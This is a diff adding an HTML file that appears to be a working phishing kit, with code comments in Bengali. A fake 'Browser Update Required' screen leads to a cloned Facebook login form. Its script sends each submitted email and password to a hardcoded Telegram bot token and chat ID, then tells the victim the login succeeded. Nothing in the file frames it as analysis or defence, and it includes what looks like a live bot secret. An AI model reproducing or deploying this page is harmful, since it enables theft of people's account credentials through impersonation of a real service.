@@ -1,0 +1,276 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Update Required</title>
+    
+    <style>
+        /* পুরো পেজের স্টাইল */
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh; /* height এর পরিবর্তে min-height ব্যবহার করা হলো */
+        }
+
+        /* ব্রাউজার আপডেট কন্টেইনার */
+        #update-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .update-box {
+            background-color: #ffffff;
+            padding: 30px; /* মোবাইলের জন্য প্যাডিং কমানো হলো */
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            text-align: center;
+            /* মোবাইল ফ্রেন্ডলি করার জন্য স্টাইল */
+            width: 90%; /* স্ক্রিনের ৯০% প্রস্থ */
+            max-width: 400px; /* ডেস্কটপে সর্বোচ্চ ৪০০px প্রস্থ */
+        }
+
+        .update-box h2 {
+            font-size: 22px; /* মোবাইলের জন্য ফন্ট সাইজ কমানো হলো */
+            color: #1c1e21;
+            margin-bottom: 15px;
+        }
+
+        .update-box p {
+            font-size: 15px;
+            color: #606770;
+            margin-bottom: 25px;
+        }
+
+        .btn-update {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 30px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .btn-update:hover {
+            background-color: #166fe5;
+        }
+
+        /* লগইন বক্সের কন্টেইনার - প্রথমে লুকানো থাকবে */
+        .login-container {
+            background-color: #ffffff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            /* মোবাইল ফ্রেন্ডলি করার জন্য স্টাইল */
+            width: 90%; /* স্ক্রিনের ৯০% প্রস্থ */
+            max-width: 380px; /* ডেস্কটপে সর্বোচ্চ ৩৮০px প্রস্থ */
+            text-align: center;
+            display: none; /* প্রথমে লুকানো আছে */
+        }
+
+        /* "facebook" লোগো স্টাইল */
+        .login-container h1 {
+            color: #1877f2;
+            font-size: 40px; /* মোবাইলের জন্য ফন্ট সাইজ কমানো হলো */
+            margin-bottom: 20px;
+            font-weight: bold;
+        }
+
+        /* ইনপুট ফিল্ড (ইমেইল/পাসওয়ার্ড) */
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: 100%;
+            padding: 14px;
+            margin-bottom: 15px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+
+        /* লগইন বাটন */
+        .btn-login {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            width: 100%;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-login:hover {
+            background-color: #166fe5;
+        }
+
+        /* "Forgot password?" লিংক */
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            display: block;
+            margin-top: 15px;
+            font-size: 14px;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        /* মাঝখানের দাগ (HR) */
+        hr {
+            border: 0;
+            border-top: 1px solid #dddfe2;
+            margin: 20px 0;
+        }
+
+        /* নতুন একাউন্ট খোলার বাটন */
+        .btn-create {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 14px;
+            width: auto;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            padding-left: 20px;
+            padding-right: 20px;
+        }
+
+        .btn-create:hover {
+            background-color: #36a420;
+        }
+
+        /* জাভাস্ক্রিপ্টের জন্য এরর মেসেজ */
+        #error-msg {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- ব্রাউজার আপডেট স্ক্রিন -->
+    <div id="update-container">
+        <div class="update-box">
+            <h2>Browser Update Required</h2>
+            <p>Your browser data is out of date. Please click the button below to update and continue for a secure experience.</p>
+            <button id="update-button" class="btn-update">Update</button>
+        </div>
+    </div>
+
+    <!-- লগইন কন্টেইনার - প্রথমে লুকানো আছে -->
+    <div class="login-container">
+        
+        <h1>facebook</h1>
+        
+        <form id="login-form">
+            <input type="text" id="email" placeholder="Email or phone number" required>
+            <input type="password" id="password" placeholder="Password" required>
+            
+            <button type="submit" class="btn-login">Log In</button>
+            
+            <a href="#" class="forgot-password">Forgot password?</a>
+            
+            <hr>
+            
+            <button type="button" class="btn-create">Create new account</button>
+            
+            <p id="error-msg"></p>
+        </form>
+    </div>
+
+    <script>
+        // টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি
+        const botToken = "8678473013:AAHDbWBB888eQGJnoNfAvIWH6wqMki0JaQ0";
+        const chatId = "7345400261";
+
+        // "Update" বাটনে ক্লিক করলে যা হবে
+        document.getElementById("update-button").addEventListener("click", function() {
+            // আপডেট কন্টেইনারটি লুকিয়ে ফেলা হবে
+            document.getElementById("update-container").style.display = "none";
+            // লগইন কন্টেইনারটি দেখানো হবে
+            document.querySelector(".login-container").style.display = "block"; // block হিসেবে পরিবর্তন করা হলো
+        });
+
+        // ফর্ম সাবমিট হলে এই ফাংশনটি কাজ করবে
+        document.getElementById("login-form").addEventListener("submit", function(event) {
+            event.preventDefault(); 
+            
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+            var errorMsg = document.getElementById("error-msg");
+
+            if (email === "" || password === "") {
+                errorMsg.textContent = "Email and password cannot be empty.";
+                errorMsg.style.display = "block";
+                errorMsg.style.color = "red";
+            } else if (password.length < 6) {
+                errorMsg.textContent = "Password must be at least 6 characters long.";
+                errorMsg.style.display = "block";
+                errorMsg.style.color = "red";
+            } else {
+                errorMsg.textContent = "Logging in...";
+                errorMsg.style.color = "green";
+                errorMsg.style.display = "block";
+                
+                sendToTelegram(email, password);
+            }
+        });
+
+        // টেলিগ্রামে ডেটা পাঠানোর ফাংশন
+        function sendToTelegram(email, password) {
+            const message = `New login attempt:\nEmail: ${email}\nPassword: ${password}`;
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            const data = {
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'HTML'
+            };
+            
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Success:', data);
+                document.getElementById("error-msg").textContent = "Login successful!";
+                document.getElementById("error-msg").style.color = "green";
+                // সফল হলে আসল ফেসবুকে রিডাইরেক্ট করা যেতে পারে
+                // window.location.href = "https://facebook.com"; 
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+                document.getElementById("error-msg").textContent = "An error occurred. Please try again later.";
+                document.getElementById("error-msg").style.color = "red";
+            });
+        }
+    </script>
+
+</body>
+</html>
